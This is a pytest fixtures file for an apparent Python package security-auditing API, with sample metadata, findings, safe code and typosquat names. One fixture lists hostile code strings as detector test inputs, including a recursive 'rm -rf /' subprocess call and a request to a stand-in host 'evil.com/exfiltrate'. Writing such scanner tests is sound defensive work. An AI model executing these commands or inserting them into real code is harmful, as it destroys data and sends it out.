"""Shared test fixtures and configuration."""
import pytest
from fastapi.testclient import TestClient
from app.main import app
from app.api.schemas import PackageMetadata, Finding, CategoryResult


@pytest.fixture
def client():
    """FastAPI test client."""
    return TestClient(app)


@pytest.fixture
def sample_package_metadata():
    """Sample package metadata for testing."""
    return PackageMetadata(
        name="test-package",
        version="1.0.0",
        summary="A test package for security auditing",
        author="Test Author",
        author_email="test@example.com",
        license="MIT",
        home_page="https://github.com/test/test-package",
        requires_python=">=3.8",
        classifiers=[
            "Development Status :: 4 - Beta",
            "Intended Audience :: Developers",
            "License :: OSI Approved :: MIT License",
            "Programming Language :: Python :: 3.8",
        ],
        keywords=["security", "testing"],
        project_urls={
            "Source": "https://github.com/test/test-package",
            "Bug Reports": "https://github.com/test/test-package/issues",
        }
    )


@pytest.fixture
def sample_finding():
    """Sample security finding for testing."""
    return Finding(
        id="test-finding-1",
        title="Test Security Issue",
        description="This is a test security finding",
        severity="high",
        category="static_code",
        metadata={"test_key": "test_value"},
        references=["https://example.com/advisory"],
        remediation="Fix the security issue"
    )


@pytest.fixture
def sample_category_result():
    """Sample category result for testing."""
    return CategoryResult(
        category="test_category",
        score=50.0,
        risk_level="medium",
        findings_count=5,
        findings=[]
    )


@pytest.fixture
def malicious_code_sample():
    """Sample malicious code patterns for testing."""
    return {
        "eval_usage": "eval(user_input)",
        "exec_usage": "exec('malicious code')",
        "base64_obfuscation": "import base64; base64.b64decode('bWFsaWNpb3Vz')",
        "subprocess_call": "subprocess.call(['rm', '-rf', '/'])",
        "network_request": "requests.get('http://evil.com/exfiltrate')",
    }


@pytest.fixture
def safe_code_sample():
    """Sample safe code for testing."""
    return '''
def hello_world():
    """A simple hello world function."""
    return "Hello, World!"

class Calculator:
    """A simple calculator class."""

    def add(self, a, b):
        return a + b

    def subtract(self, a, b):
        return a - b
'''


@pytest.fixture
def typosquat_packages():
    """Sample typosquatting package names for testing."""
    return {
        "legitimate": [
            "requests",
            "numpy",
            "django",
            "flask",
            "pytest",
        ],
        "typosquats": [
            "requets",  # Transposition
            "requessts",  # Repetition
            "rquests",  # Omission
            "requestss",  # Addition
            "reque5ts",  # Substitution
        ]
    }
